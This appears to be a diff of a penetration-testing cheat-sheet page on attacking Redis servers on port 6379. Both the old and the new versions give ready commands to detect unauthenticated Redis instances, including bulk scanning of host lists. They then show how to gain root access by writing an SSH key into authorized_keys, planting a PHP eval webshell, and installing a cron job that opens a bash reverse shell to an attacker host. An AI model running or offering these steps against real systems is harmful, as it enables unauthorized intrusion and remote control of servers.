@@ -1,76 +1,58 @@
 # 6379 - Redis
 
-<details>
+## Potential Risks
 
-<summary>Introduction</summary>
-
-Redis 是一个开源的内存键值存储数据库，也被称为数据结构服务器。它支持多种数据结构，如字符串、哈希表、列表、集合和有序集合等，提供了丰富的操作命令来操作这些数据结构。Redis 的特点包括高性能、持久化、复制、集群和支持丰富的数据类型等。由于其快速的读写速度和丰富的功能，Redis 被广泛应用于缓存、会话存储、消息队列、排行榜和实时统计等场景中。它也被用作分布式锁和发布/订阅系统的解决方案。
-
-</details>
-
-<table><thead><tr><th width="178">Name</th><th>Redis</th></tr></thead><tbody><tr><td><strong>Default Port</strong></td><td>6379</td></tr><tr><td><strong>RCE</strong></td><td>Feasible</td></tr><tr><td><strong>Vulnerability</strong></td><td><ul><li>Unauthorized Access</li><li>File Write (GetShell)</li></ul></td></tr></tbody></table>
-
-## Unauthorized Access
-
-{% code title="Environment" %}
-```bash
-HOST=; PORT=6379; # TARGET HOST INFO
-```
-{% endcode %}
-
-{% code title="Validation" %}
-```
-1) telnet $HOST $PORT
-2) Enter "INFO"
-```
-{% endcode %}
-
-If the target host returns Redis-related information, it indicates that unauthorized access is allowed.
-
-## Write File
-
-{% hint style="info" %}
-Writing files may affect the server normal operation. Prioritize writing the SSH public key.
-{% endhint %}
-
-{% code title="Environment" %}
-```bash
-HOST=; PORT=6379; # TARGET HOST INFO
-```
-{% endcode %}
+### Unauthorized Access
 
 ```bash
-# (1) SSH public key
+# https://github.com/yuukisec/iPoCs
+# RHOST=remoteHost; RPORT=6379
+nuclei -t ~/ipocs -id redis-unauth -u $RHOST:$RPORT
 
-ssh-keygen -t rsa
-(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/id_rsa.pub
-cat /tmp/id_rsa.pub | redis-cli -h $HOST -p $PORT -x set crackit
-rm /tmp/id_rsa.pub
-
-redis-cli -h $HOST -p $PORT
-
-# In redis CLI
-CONFIG SET DIR /root/.ssh/
-CONFIG SET DBFILENAME "authorized_keys"
-SAVE
-
-ssh -i ~/.ssh/id_rsa root@HOST
-redis-cli -h $HOST -p $PORT
-
-# (2) WebShell
-CONFIG SET DIR /var/www/html
-CONFIG SET DBFILENAME exec.php
-SET crackit "\n\n\n\n<?php @eval($_REQUEST['exec']);?>\n\n\n\n"
-SAVE
-
-# (3) crontab
-CONFIG SET DIR /etc/cron.d
-CONFIG SET DBFILENAME reverse_shell
-SET crackit "\n\n\n\n* * * * * root bash -i >& /dev/tcp/HOST/PORT 0>&1\n\n\n\n"
-SAVE
+# Bulk testing
+# RHOST_LIST=hosts.txt
+nuclei -t ~/ipocs -id redis-unauth -l $RHOST_LIST -c 100 -bs 100
 ```
 
-## Graphical Tool
+## Exploitation
 
-[Another Redis Desktop Manager](https://goanother.com/cn/)
+### Write File
+
+```bash
+# Method 1: Write SSH public key
+# RHOST=remoteHost; RPORT=
+# Step 1: Generates an SSH key pair
+if [ -f /tmp/.ssh_key ]; then; rm /tmp/.ssh_key /tmp/.ssh_key.pub; fi
+ssh-keygen -t rsa -b 2048 -N "" -f /tmp/.ssh_key
+(echo -e "\n\n"; awk '{print $1,$2;}' /tmp/.ssh_key.pub; echo -e "\n\n") > /tmp/.ssh_key_redis.pub
+# Step 2: Upload SSH public key
+cat /tmp/.ssh_key_redis.pub | redis-cli -h $RHOST -p $RPORT -x set santa
+redis-cli -h $RHOST -p $RPORT
+> CONFIG SET DIR /root/.ssh/ # The alternative is `CONFIG SET DIR /etc/ssh/`
+> CONFIG SET DBFILENAME "authorized_keys"
+> SAVE
+# Step 3: Connect SSH using the private key
+ssh -i /tmp/.ssh_key root@localhost
+
+# Method 2: Write WebShell
+redis-cli -h $RHOST -p $RPORT
+> CONFIG SET DIR /var/www/html
+> CONFIG SET DBFILENAME santa.php
+> SET santa "\n\n\n\n<?php @eval($_REQUEST['santa']);?>\n\n\n\n"
+> SAVE
+
+# Method 3: Write Linux crontab
+redis-cli -h $RHOST -p $RPORT
+> CONFIG SET DIR /etc/cron.d
+> CONFIG SET DBFILENAME santa_revs
+> SET santa "\n\n\n\n* * * * * root bash -i >& /dev/tcp/$EHOST/$EPORT 0>&1\n\n\n\n"
+> SAVE
+```
+
+For more information, please refer to page [OOB > Reverse Shell > crontab (unix-only)](../../one-page-for-subject/out-of-band-technology.md#reverse-shell).
+
+### GUI Tools
+
+* [Another Redis Desktop Manager](https://goanother.com/cn/)
+* [https://github.com/SafeGroceryStore/MDUT](https://github.com/SafeGroceryStore/MDUT)
 
